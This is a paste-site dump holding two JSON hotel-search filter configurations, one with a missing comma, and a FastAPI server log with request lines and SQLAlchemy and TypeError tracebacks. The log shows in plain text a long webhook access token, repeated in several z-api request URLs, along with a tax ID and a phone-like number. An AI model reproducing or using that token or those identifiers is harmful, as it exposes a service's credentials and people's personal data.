      ""label"": ""9.0+""
    }
  ],
  ""amenities"": [
    {
      ""id"": ""FREE_CANCELLATION"",
      ""label"": ""Free Cancellation""
    },
    {
      ""id"": ""FINTRNT"",
      ""label"": ""Free Internet""
    },
    {
      ""id"": ""FBRKFST"",
      ""label"": ""Free Breakfast""
    },
    {
      ""id"": ""FPRKING"",
      ""label"": ""Free Parking""
    },
    {
      ""id"": ""FITSPA"",
      ""label"": ""Fitness Center""
    },
    {
      ""id"": ""SPOOL"",
      ""label"": ""Swimming Pool""
    },
    {
      ""id"": ""AIRSHUTTL"",
      ""label"": ""Airport Shuttle""
    },
    {
      ""id"": ""FAIRSHUTTL"",
      ""label"": ""Free Airport Shuttle""
    },
    {
      ""id"": ""BUSCNTR"",
      ""label"": ""Business Center""
    },
    {
      ""id"": ""CASINO"",
      ""label"": ""Casino""
    },
    {
      ""id"": ""PETALLOW"",
      ""label"": ""Pets Allowed""
    },
    {
      ""id"": ""RESTRNT"",
      ""label"": ""Restaurant""
    },
    {
      ""id"": ""HANDFAC"",
      ""label"": ""Handicapped Rooms/Facilities""
    },
    {
      ""id"": ""NSMKFAC"",
      ""label"": ""No Smoking Rooms/Facilities""
    },
    {
      ""id"": ""SPA"",
      ""label"": ""Spa""
    }
  ],
  ""propertyType"": [
    {
      ""id"": ""204"",
      ""label"": ""Hotels""
    },
    {
      ""id"": ""201"",
      ""label"": ""Apartments""
    },
    {
      ""id"": ""208"",
      ""label"": ""Bed &amp; Breakfast""
    },
    {
      ""id"": ""203"",
      ""label"": ""Hostels""
    },
    {
      ""id"": ""205"",
      ""label"": ""Motels""
    },
    {
      ""id"": ""206"",
      ""label"": ""Resorts""
    },
    {
      ""id"": ""213"",
      ""label"": ""Villas""
    },
    {
      ""id"": ""216"",
      ""label"": ""Guest Houses""
    },
    {
      ""id"": ""218"",
      ""label"": ""Inns""
    },
    {
      ""id"": ""219"",
      ""label"": ""Aparthotels""
    },
    {
      ""id"": ""220"",
      ""label"": ""Holiday Homes""
    },
    {
      ""id"": ""501"",
      ""label"": ""Casinos""
    }
  ],
  ""quickFilters"": {
    ""allHotels"": {
      ""amenityIds"": [
        ""FBRKFST"",
        ""SPOOL"",
        ""PETALLOW"",
        ""FPRKING"",
        ""FREE_CANCELLATION""
      ],
      ""pricebreakers"": true
    },
    ""expressDeals"": {
      ""amenityIds"": [
        ""FBRKFST"",
        ""SPOOL"",
        ""PETALLOW"",
        ""FPRKING"",
        ""FREE_CANCELLATION""
      ]
    }
  }
}"
mcXYzgki,Untitled,sanya5791,JSON,Monday 2nd of October 2023 03:44:11 PM CDT,"{
  ""filterCountWithShowMore"": 3,
  ""allFilterOptionsCount"": 1,
  ""maxPrice"": 300,
  ""starRatings"": [
    {
      ""id"": ""3.0"",
      ""label"": ""3+ Star Level""
    },
    {
      ""id"": ""4.0"",
      ""label"": ""4+ Star Level""
    },
    {
      ""id"": ""5.0"",
      ""label"": ""5+ Star Level""
    }
  ],
  ""guestScore"": [
    {
      ""id"": ""7.0"",
      ""label"": ""7.0+""
    },
    {
      ""id"": ""8.0"",
      ""label"": ""8.0+""
    },
    {
      ""id"": ""9.0"",
      ""label"": ""9.0+""
    }
  ],
  ""amenities"": [
    {
      ""id"": ""FREE_CANCELLATION"",
      ""label"": ""Free Cancellation""
    },
    {
      ""id"": ""FINTRNT"",
      ""label"": ""Free Internet""
    },
    {
      ""id"": ""FBRKFST"",
      ""label"": ""Free Breakfast""
    },
    {
      ""id"": ""FPRKING"",
      ""label"": ""Free Parking""
    },
    {
      ""id"": ""FITSPA"",
      ""label"": ""Fitness Center""
    },
    {
      ""id"": ""SPOOL"",
      ""label"": ""Swimming Pool""
    },
    {
      ""id"": ""AIRSHUTTL"",
      ""label"": ""Airport Shuttle""
    },
    {
      ""id"": ""FAIRSHUTTL"",
      ""label"": ""Free Airport Shuttle""
    },
    {
      ""id"": ""BUSCNTR"",
      ""label"": ""Business Center""
    },
    {
      ""id"": ""CASINO"",
      ""label"": ""Casino""
    },
    {
      ""id"": ""PETALLOW"",
      ""label"": ""Pets Allowed""
    },
    {
      ""id"": ""RESTRNT"",
      ""label"": ""Restaurant""
    },
    {
      ""id"": ""HANDFAC"",
      ""label"": ""Handicapped Rooms/Facilities""
    },
    {
      ""id"": ""NSMKFAC"",
      ""label"": ""No Smoking Rooms/Facilities""
    },
    {
      ""id"": ""SPA"",
      ""label"": ""Spa""
    }
  ],
  ""propertyType"": [
    {
      ""id"": ""204"",
      ""label"": ""Hotels""
    },
    {
      ""id"": ""201"",
      ""label"": ""Apartments""
    },
    {
      ""id"": ""208"",
      ""label"": ""Bed &amp; Breakfast""
    },
    {
      ""id"": ""203"",
      ""label"": ""Hostels""
    },
    {
      ""id"": ""205"",
      ""label"": ""Motels""
    },
    {
      ""id"": ""206"",
      ""label"": ""Resorts""
    },
    {
      ""id"": ""213"",
      ""label"": ""Villas""
    },
    {
      ""id"": ""216"",
      ""label"": ""Guest Houses""
    },
    {
      ""id"": ""218"",
      ""label"": ""Inns""
    },
    {
      ""id"": ""219"",
      ""label"": ""Aparthotels""
    },
    {
      ""id"": ""220"",
      ""label"": ""Holiday Homes""
    },
    {
      ""id"": ""501"",
      ""label"": ""Casinos""
    }
  ],
  ""quickFilters"": {
    ""allHotels"": {
      ""amenityIds"": [
        ""FBRKFST"",
        ""SPOOL"",
        ""PETALLOW"",
        ""FPRKING"",
        ""FREE_CANCELLATION""
      ],
      ""pricebreakers"": true
    }""expressDeals"": {
      ""amenityIds"": [
        ""FBRKFST"",
        ""SPOOL"",
        ""PETALLOW"",
        ""FPRKING"",
        ""FREE_CANCELLATION""
      ]
    }
  }
}"
KV3DBV85,Untitled,possebon,PHP,Monday 2nd of October 2023 03:17:50 PM CDT,"2023-10-02 16:50:59.346 | DEBUG    | app.api.api_v1.endpoints.spot:fetch_spot_id:118 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:50:59.350 | SUCCESS  | app.api.api_v1.endpoints.spot:fetch_spot_id:145 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=200 | message=Keyword:78
2023-10-02 16:50:59.351 | DEBUG    | app.api.api_v1.endpoints.spot:fetch_spot_id:118 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:50:59.351 | DEBUG    | app.api.api_v1.endpoints.spot:fetch_spot_id:118 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=000 | message=Route_Called
INFO:     10.108.0.4:40352 - ""GET /api/v1/spots/78 HTTP/1.0"" 200 OK
2023-10-02 16:50:59.357 | SUCCESS  | app.api.api_v1.endpoints.spot:fetch_spot_id:145 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=200 | message=Keyword:78
2023-10-02 16:50:59.357 | SUCCESS  | app.api.api_v1.endpoints.spot:fetch_spot_id:145 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=200 | message=Keyword:78
2023-10-02 16:50:59.358 | DEBUG    | app.api.api_v1.endpoints.spot:fetch_spot_id:118 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=000 | message=Route_Called
INFO:     10.108.0.4:40372 - ""GET /api/v1/spots/78 HTTP/1.0"" 200 OK
2023-10-02 16:50:59.362 | SUCCESS  | app.api.api_v1.endpoints.spot:fetch_spot_id:145 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=200 | message=Keyword:70
INFO:     10.108.0.4:40368 - ""GET /api/v1/spots/78 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:40382 - ""GET /api/v1/spots/70 HTTP/1.0"" 200 OK
2023-10-02 16:50:59.541 | DEBUG    | app.api.api_v1.endpoints.spot:fetch_spot_id:118 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:50:59.547 | SUCCESS  | app.api.api_v1.endpoints.spot:fetch_spot_id:145 - entity=SPOT | method=GET | route=/spots/{search_id} | returncode=200 | message=Keyword:70
INFO:     10.108.0.4:40398 - ""GET /api/v1/spots/70 HTTP/1.0"" 200 OK
2023-10-02 16:51:00.789 | DEBUG    | app.api.api_v1.endpoints.building:search_buildings:44 - entity=BUILDING | method=GET | route=/buildings/{keyword} | returncode=000 | message=Route_Called
INFO:     10.108.0.4:40414 - ""GET /api/v1/buildings/?max_results=10 HTTP/1.0"" 500 Internal Server Error
ERROR:    Exception in ASGI application
Traceback (most recent call last):
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/protocols/http/h11_impl.py"", line 407, in run_asgi
    result = await app(  # type: ignore[func-returns-value]
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/middleware/proxy_headers.py"", line 78, in __call__
    return await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/applications.py"", line 269, in __call__
    await super().__call__(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/applications.py"", line 124, in __call__
    await self.middleware_stack(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 184, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 162, in __call__
    await self.app(scope, receive, _send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/cors.py"", line 84, in __call__
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 93, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 82, in __call__
    await self.app(scope, receive, sender)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 21, in __call__
    raise e
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 18, in __call__
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 670, in __call__
    await route.handle(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 266, in handle
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 65, in app
    response = await func(request)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 227, in app
    raw_response = await run_endpoint_function(
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 162, in run_endpoint_function
    return await run_in_threadpool(dependant.call, **values)
  File ""/usr/local/lib/python3.8/site-packages/starlette/concurrency.py"", line 41, in run_in_threadpool
    return await anyio.to_thread.run_sync(func, *args)
  File ""/usr/local/lib/python3.8/site-packages/anyio/to_thread.py"", line 33, in run_sync
    return await get_async_backend().run_sync_in_worker_thread(
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 2106, in run_sync_in_worker_thread
    return await future
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 833, in run
    result = context.run(func, *args)
  File ""/app/api/api_v1/endpoints/building.py"", line 56, in search_buildings
    buildings = crud.building.get_multi(db=db, limit=max_results, offset=offset)
TypeError: get_multi() got an unexpected keyword argument 'offset'
INFO:     10.108.0.4:40726 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:40742 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:40756 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
2023-10-02 16:51:19.703 | DEBUG    | app.api.api_v1.endpoints.user:fetch_user:133 - entity=USER | method=GET | route=/users/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:51:19.709 | SUCCESS  | app.api.api_v1.endpoints.user:fetch_user:161 - entity=USER | method=GET | route=/users/{search_id} | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:40768 - ""GET /api/v1/users/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:40780 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:40784 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
2023-10-02 16:51:19.901 | DEBUG    | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:245 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=000 | message=Route_Called
2023-10-02 16:51:19.906 | SUCCESS  | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:275 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:40814 - ""GET /api/v1/userdocuments/user_id/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:40800 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
2023-10-02 16:51:20.152 | DEBUG    | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:410 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=000 | message=Route_Called
2023-10-02 16:51:20.156 | SUCCESS  | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:481 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=200 | message=Keyword:{'filter':_[{'key':_'user_requested.taxid',_'operation':_'eq',_'value':_'61656216000'}]}
INFO:     10.108.0.4:40828 - ""POST /api/v1/tokens/dynamic-filter?page=1&limit=100/ HTTP/1.0"" 200 OK
2023-10-02 16:51:20.351 | DEBUG    | app.api.api_v1.endpoints.building:fetch_building_id:119 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:51:20.357 | SUCCESS  | app.api.api_v1.endpoints.building:fetch_building_id:148 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=200 | message=Keyword:8
INFO:     10.108.0.4:40836 - ""GET /api/v1/buildings/8 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55736 - ""OPTIONS /api/v1/users/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55750 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55776 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 500 Internal Server Error
ERROR:    Exception in ASGI application
Traceback (most recent call last):
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/protocols/http/h11_impl.py"", line 407, in run_asgi
    result = await app(  # type: ignore[func-returns-value]
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/middleware/proxy_headers.py"", line 78, in __call__
    return await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/applications.py"", line 269, in __call__
    await super().__call__(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/applications.py"", line 124, in __call__
    await self.middleware_stack(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 184, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 162, in __call__
    await self.app(scope, receive, _send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/cors.py"", line 92, in __call__
    await self.simple_response(scope, receive, send, request_headers=headers)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/cors.py"", line 147, in simple_response
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 93, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 82, in __call__
    await self.app(scope, receive, sender)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 21, in __call__
    raise e
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 18, in __call__
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 670, in __call__
    await route.handle(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 266, in handle
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 65, in app
    response = await func(request)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 227, in app
    raw_response = await run_endpoint_function(
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 162, in run_endpoint_function
    return await run_in_threadpool(dependant.call, **values)
  File ""/usr/local/lib/python3.8/site-packages/starlette/concurrency.py"", line 41, in run_in_threadpool
    return await anyio.to_thread.run_sync(func, *args)
  File ""/usr/local/lib/python3.8/site-packages/anyio/to_thread.py"", line 33, in run_sync
    return await get_async_backend().run_sync_in_worker_thread(
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 2106, in run_sync_in_worker_thread
    return await future
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 833, in run
    result = context.run(func, *args)
  File ""/app/api/api_v1/endpoints/user.py"", line 356, in fetch_grouped_info
    grouped_info = crud.user.get_grouped_info(
  File ""/app/crud/crud_user.py"", line 128, in get_grouped_info
    for token in user.token_requested:
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 487, in __get__
    return self.impl.get(state, dict_)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 959, in get
    value = self._fire_loader_callables(state, key, passive)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 995, in _fire_loader_callables
    return self.callable_(state, passive)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/strategies.py"", line 863, in _load_for_state
    raise orm_exc.DetachedInstanceError(
sqlalchemy.orm.exc.DetachedInstanceError: Parent instance <User at 0x7f273a9d9790> is not bound to a Session; lazy load operation of attribute 'token_requested' cannot proceed (Background on this error at: https://sqlalche.me/e/14/bhk3)
2023-10-02 16:53:49.653 | DEBUG    | app.api.api_v1.endpoints.user:fetch_user:133 - entity=USER | method=GET | route=/users/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:53:49.658 | SUCCESS  | app.api.api_v1.endpoints.user:fetch_user:161 - entity=USER | method=GET | route=/users/{search_id} | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:55792 - ""GET /api/v1/users/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55764 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55796 - ""OPTIONS /api/v1/userdocuments/user_id/486 HTTP/1.0"" 200 OK
2023-10-02 16:53:50.276 | DEBUG    | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:245 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=000 | message=Route_Called
2023-10-02 16:53:50.280 | SUCCESS  | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:275 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:55812 - ""GET /api/v1/userdocuments/user_id/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55824 - ""OPTIONS /api/v1/tokens/dynamic-filter?page=1&limit=100/ HTTP/1.0"" 200 OK
2023-10-02 16:53:50.774 | DEBUG    | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:410 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=000 | message=Route_Called
2023-10-02 16:53:50.777 | SUCCESS  | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:481 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=200 | message=Keyword:{'filter':_[{'key':_'user_requested.taxid',_'operation':_'eq',_'value':_'61656216000'}]}
INFO:     10.108.0.4:55826 - ""POST /api/v1/tokens/dynamic-filter?page=1&limit=100/ HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55832 - ""OPTIONS /api/v1/buildings/8 HTTP/1.0"" 200 OK
2023-10-02 16:53:51.182 | DEBUG    | app.api.api_v1.endpoints.building:fetch_building_id:119 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:53:51.187 | SUCCESS  | app.api.api_v1.endpoints.building:fetch_building_id:148 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=200 | message=Keyword:8
INFO:     10.108.0.4:55842 - ""GET /api/v1/buildings/8 HTTP/1.0"" 200 OK
2023-10-02 17:01:56.497 | ERROR    | __main__:validation_exception_handler:42 - entity=CAPTURED_EXCEPTION | method=CAPTURED_EXCEPTION | route=/captured_exception/{exception} | returncode=422 | message=Exception_Captured.Keyword:Exception:<starlette.requests.Request_object_at_0x7f27484ef820>:_1_validation_error_for_Request_body_->_forwarded_field_required_(type=value_error.missing)
INFO:     10.108.0.4:35600 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 422 Unprocessable Entity
2023-10-02 17:09:13.967 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:54976 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:09:22.506 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:49976 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49700 - ""POST /api/v1/z-api/set-manual-mode/555181708362?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:13:12.152 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:35078 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:14:46.008 | ERROR    | __main__:validation_exception_handler:42 - entity=CAPTURED_EXCEPTION | method=CAPTURED_EXCEPTION | route=/captured_exception/{exception} | returncode=422 | message=Exception_Captured.Keyword:Exception:<starlette.requests.Request_object_at_0x7f27486b9550>:_1_validation_error_for_Request_body_->_forwarded_field_required_(type=value_error.missing)
INFO:     10.108.0.4:54954 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 422 Unprocessable Entity
INFO:     10.108.0.4:49644 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49660 - ""OPTIONS /api/v1/users/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49666 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49670 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
2023-10-02 17:14:49.096 | DEBUG    | app.api.api_v1.endpoints.user:fetch_user:133 - entity=USER | method=GET | route=/users/{search_id} | returncode=000 | message=Route_Called
2023-10-02 17:14:49.131 | SUCCESS  | app.api.api_v1.endpoints.user:fetch_user:161 - entity=USER | method=GET | route=/users/{search_id} | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:49672 - ""GET /api/v1/users/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49684 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 500 Internal Server Error
ERROR:    Exception in ASGI application
Traceback (most recent call last):
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/protocols/http/h11_impl.py"", line 407, in run_asgi
    result = await app(  # type: ignore[func-returns-value]
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/middleware/proxy_headers.py"", line 78, in __call__
    return await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/applications.py"", line 269, in __call__
    await super().__call__(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/applications.py"", line 124, in __call__
    await self.middleware_stack(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 184, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 162, in __call__
    await self.app(scope, receive, _send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/cors.py"", line 92, in __call__
    await self.simple_response(scope, receive, send, request_headers=headers)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/cors.py"", line 147, in simple_response
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 93, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 82, in __call__
    await self.app(scope, receive, sender)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 21, in __call__
    raise e
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 18, in __call__
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 670, in __call__
    await route.handle(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 266, in handle
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 65, in app
    response = await func(request)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 227, in app
    raw_response = await run_endpoint_function(
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 162, in run_endpoint_function
    return await run_in_threadpool(dependant.call, **values)
  File ""/usr/local/lib/python3.8/site-packages/starlette/concurrency.py"", line 41, in run_in_threadpool
    return await anyio.to_thread.run_sync(func, *args)
  File ""/usr/local/lib/python3.8/site-packages/anyio/to_thread.py"", line 33, in run_sync
    return await get_async_backend().run_sync_in_worker_thread(
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 2106, in run_sync_in_worker_thread
    return await future
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 833, in run
    result = context.run(func, *args)
  File ""/app/api/api_v1/endpoints/user.py"", line 356, in fetch_grouped_info
    grouped_info = crud.user.get_grouped_info(
  File ""/app/crud/crud_user.py"", line 128, in get_grouped_info
    for token in user.token_requested:
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 487, in __get__
    return self.impl.get(state, dict_)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 959, in get
    value = self._fire_loader_callables(state, key, passive)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 995, in _fire_loader_callables
    return self.callable_(state, passive)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/strategies.py"", line 863, in _load_for_state
    raise orm_exc.DetachedInstanceError(
sqlalchemy.orm.exc.DetachedInstanceError: Parent instance <User at 0x7f2748c17df0> is not bound to a Session; lazy load operation of attribute 'token_requested' cannot proceed (Background on this error at: https://sqlalche.me/e/14/bhk3)
INFO:     10.108.0.4:49676 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49692 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49704 - ""OPTIONS /api/v1/userdocuments/user_id/486 HTTP/1.0"" 200 OK
2023-10-02 17:14:51.063 | DEBUG    | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:245 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=000 | message=Route_Called
2023-10-02 17:14:51.077 | SUCCESS  | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:275 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:49714 - ""GET /api/v1/userdocuments/user_id/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49730 - ""OPTIONS /api/v1/tokens/c5041dc9-c74e-4509-a665-45b7114b2e7a HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49740 - ""OPTIONS /api/v1/tokens/dynamic-filter?page=1&limit=100/ HTTP/1.0"" 200 OK
2023-10-02 17:14:53.695 | DEBUG    | app.api.api_v1.endpoints.token:fetch_token_id:507 - entity=TOKENS | method=GET | route=/tokens/{search_id} | returncode=000 | message=Route_Called
2023-10-02 17:14:53.697 | DEBUG    | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:410 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=000 | message=Route_Called
